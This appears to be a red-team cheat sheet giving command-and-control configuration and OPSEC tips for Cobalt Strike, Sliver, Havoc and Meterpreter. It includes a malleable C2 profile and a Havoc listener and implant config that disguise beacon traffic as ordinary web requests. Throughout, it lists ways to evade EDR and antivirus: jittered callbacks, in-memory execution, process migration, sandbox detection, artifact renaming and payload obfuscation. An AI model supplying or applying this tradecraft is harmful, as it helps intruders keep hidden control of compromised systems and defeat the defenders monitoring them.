Malleable C2 Profile — Key Settings
malleable c2 
set sleeptime  "60000";  # 60 s callback interval
set jitter     "20";     # 20 % jitter
set useragent  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set dns_max_txt "252";

http-get {
  set uri "/api/v1/health";
  client {
    header "Accept" "application/json";
  }
}
OPSEC Notes
⚠ Operational Security
  • Use powerpick over powershell — avoids spawning powershell.exe, reducing EDR telemetry
  • Set sleep >60 s with jitter (e.g. sleep 120 20) to break timing-based beacon detection
  • Use execute-assembly for .NET tooling — runs entirely in-memory, nothing written to disk
  • Avoid getsystem on EDR-monitored endpoints; token impersonation is heavily flagged
  • Prefer DNS or DoH listener for egress in networks with restrictive HTTP inspection
  • Rename default artifacts — artifact.exe and default pipe names are widely signatured
  • Customize the malleable profile UA, URIs, and headers to match a plausible application

OPSEC Notes
⚠ Operational Security
  • Sliver is open-source — AV/EDR signatures exist for default builds; use --obfuscate flag or custom compilation
  • mTLS provides the strongest implant-server authentication; prefer it over HTTPS when possible
  • DNS beacons are stealthiest but slow (~1 request per 10 s); avoid for interactive operations
  • Use --canary <domain> to detect if the implant is running inside a sandbox
  • Use execute-assembly --in-process to avoid the fork-and-run pattern that EDRs monitor
  • Install Armory extensions for BOF (Beacon Object File) support: armory install all
  • Limit concurrent sessions per operator to reduce C2 traffic patterns

Profile — havoc.yaotl Key Settings
toml / yaotl 
Teamserver {
    Host = "0.0.0.0"
    Port = 40056
}

Listeners {
    Http {
        Name     = "http-listener"
        Hosts    = ["<IP>"]
        HostBind = "0.0.0.0"
        Port     = 443
        Secure   = true
        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        Uris     = ["/updates", "/api/health", "/cdn/js/app.js"]
    }
}

Demon {
    Sleep  = 5
    Jitter = 20
    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

OPSEC Notes
⚠ Operational Security
  • Havoc is newer than Cobalt Strike — fewer AV/EDR signatures in the wild, but growing
  • Change Spawn64/Spawn32 from notepad.exe — default spawn processes are monitored by EDRs
  • Always use HTTPS (Secure = true) with a valid or self-signed cert; plain HTTP is trivially detected
  • dotnet inline-execute loads .NET in-process — avoids disk writes and fork-and-run detection patterns
  • Set jitter >20 % to randomize callback timing and defeat statistical beacon detection
  • Customize listener URIs and User-Agent to match a real-looking web application
  • Havoc is open-source — compile with modified build flags to reduce static signatures

OPSEC Notes
⚠ Operational Security
  • Meterpreter over reverse_https blends with web traffic and encrypts the session
  • Use migrate immediately into a less-monitored process (svchost.exe, explorer.exe) after session open
  • Avoid getsystem on EDR-heavy endpoints — token manipulation via named pipes is flagged
  • Use staged payloads (reverse_https) to minimize disk artifact size — stager is tiny, stage loads in-memory
  • Set InitialAutoRunScript migrate -f for automatic migration when a session opens
  • Use load incognito for token impersonation as an alternative to the kiwi extension
  • MSF payloads are heavily signatured — use custom encoders, Veil, or Shelter to evade static AV
